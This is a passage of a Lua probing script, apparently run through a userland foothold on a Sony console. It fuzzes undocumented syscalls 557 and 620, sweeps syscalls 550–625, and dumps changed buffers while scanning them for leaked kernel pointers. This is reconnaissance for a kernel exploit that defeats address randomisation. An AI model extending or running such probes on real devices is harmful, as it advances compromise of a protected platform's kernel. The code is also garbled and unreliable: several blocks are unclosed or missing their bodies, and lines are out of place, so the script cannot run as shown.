fill_dead(buf, 0x400)
safe_wd(sizep, 0x400)
ok, ret = pcall(function() return sc557(uint64(pid), uint64(buf), uint64(sizep)) end)
new_sz = safe_rd(sizep)
print("557(pid, buf, &size): ret=" .. (ok and tostring(to_num(ret)) or "CRASH") ..
      " size_after=" .. (new_sz or "nil"))
if check_modified(buf, 0x100) then

    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(pid,buf,&sizep)")
end

-- ============================================
-- SECTION C: Syscall 557 — struct-input patterns
-- ============================================
print("")
print("=== C: 557 STRUCT-INPUT PATTERNS ===")

local st = memory.alloc(0x200)

-- Some Sony syscalls expect a struct with size/version at offset 0
-- Pattern: {.size = sizeof(struct)}
for i = 0, 0x1FF, 4 do safe_wd(st + i, 0) end
safe_wd(st, 0x200)
ok, ret = pcall(function() return sc557(uint64(st)) end)
print("557({size=0x200}): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
local st0 = safe_rd(st)
local st4 = safe_rd(st + 4)
local st8 = safe_rd(st + 8)
if st0 ~= 0x200 or st4 ~= 0 or st8 ~= 0 then

-- Pattern: {.version=1, .size=sizeof}

ok, ret = pcall(function() return sc557(uint64(st)) end)

-- Pattern: dynlib_get_info style (size at offset 0)
for i = 0, 0x1FF, 4 do safe_wd(st + i, 0) end
safe_wd(st, 0x160)
ok, ret = pcall(function() return sc557(uint64(0), uint64(st)) end)
print("557(0, {size=0x160}): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))

    print("  struct modified after offset 4!")
    hexdump(st, 64, "  dump")
end

-- ============================================
-- SECTION D: Syscall 557 — return value analysis
-- ============================================
print("")
print("=== D: 557 RETURN VALUE ANALYSIS ===")

print("16901 = 0x" .. string.format("%X", 16901))
print("16901 / 16384 = " .. string.format("%.4f", 16901 / 16384) .. " (pages?)")
print("16901 / 4096 = " .. string.format("%.4f", 16901 / 4096))
-- Lua 5.1 has no %b; do it manually
local function to_bin(n, bits)
    bits = bits or 16
    local s = ""
    for i = bits - 1, 0, -1 do
        s = s .. (bit32.band(bit32.rshift(n, i), 1) == 1 and "1" or "0")
    end
    return s
end
print("16901 binary = " .. to_bin(16901, 16))

-- Call 10x to check if return value is stable or changing
print("stability check:")
local vals = {}
for i = 1, 10 do
    ok, ret = pcall(function() return sc557(uint64(0)) end)
    local r = ok and to_num(ret) or -999
    vals[i] = r
    if i <= 5 or r ~= vals[1] then
        print("  call " .. i .. ": " .. r)
    end
end
local all_same = true
for i = 2, 10 do

-- ============================================
-- SECTION E: Syscall 620 — same treatment

for _, arg in ipairs({1, 2, pid, 0x100, 0xFFFF}) do

-- Buffer tests
fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc620(uint64(buf)) end)
print("620(buf): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then

    scan_kptrs(buf, 0x400, "620(buf)")
end

fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc620(uint64(buf), uint64(0x400)) end)
print("620(buf, 0x400): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** 620 BUFFER MODIFIED (buf,size)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "620(buf,0x400)")
end

fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc620(uint64(pid), uint64(buf), uint64(0x400)) end)
print("620(pid, buf, 0x400): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** 620 BUFFER MODIFIED (pid,buf,size)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "620(pid,buf,0x400)")
end

-- Struct input test
for i = 0, 0x1FF, 4 do safe_wd(st + i, 0) end
safe_wd(st, 0x200)
ok, ret = pcall(function() return sc620(uint64(st)) end)
print("620({size=0x200}): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(st + 4, 0x50, 0) then
    hexdump(st, 64, "  620 struct")
    scan_kptrs(st, 0x200, "620 struct")
end

-- ============================================
-- SECTION F: Neighbor sweep 550-625
-- ============================================
print("")
print("=== F: NEIGHBOR SWEEP 550-625 ===")
-- 2026-10-17: per-call markers so a dying call is identifiable (run 2 truncated silently in F).

local known = {
    [538] = true, [539] = true,  -- evf
    [547] = true, [548] = true, [549] = true, [550] = true, [551] = true, [552] = true, -- dmem
    [557] = true, [620] = true,  -- already tested above
    [585] = true,  -- mtypeprotect
    [588] = true,  -- munmap
    [592] = true, [593] = true,  -- dynlib
}

local alive = {}
local tested = 0
for num = 550, 625 do
    if not known[num] then
        tested = tested + 1
        print(string.format("  trying %d ...", num))
        local sc = make_syscall(num)
        local ok_s, rv_s = pcall(function() return sc(uint64(0)) end)
        if ok_s then
            local r = to_num(rv_s)
            if r ~= -1 then
                print(string.format("  syscall %d: ret=%d ***ALIVE***", num, r))
                alive[#alive + 1] = {num = num, ret = r}
            end
        end
    end
end
print(string.format("=== F sweep done (%d tested, %d alive) ===", tested, #alive))

-- For any newly-found alive syscalls, try output buffer
if #alive > 0 then
    print("")
    print("=== G: ALIVE NEIGHBOR BUFFER TESTS ===")
    for _, entry in ipairs(alive) do
        print(string.format("  testing %d(buf, 0x400) ...", entry.num))
        local sc = make_syscall(entry.num)
        fill_dead(buf, 0x400)
        local ok_b, rv_b = pcall(function() return sc(uint64(buf), uint64(0x400)) end)
        print(string.format("  %d(buf, 0x400): ret=%s",
            entry.num, ok_b and tostring(to_num(rv_b)) or "CRASH"))
        if check_modified(buf, 0x100) then
            print("  *** BUFFER MODIFIED! ***")
            hexdump(buf, 64, "    " .. entry.num .. " output")
            scan_kptrs(buf, 0x400, tostring(entry.num))
        end
    end
end

print("")
print("=== PROBE 46a COMPLETE ===")
```
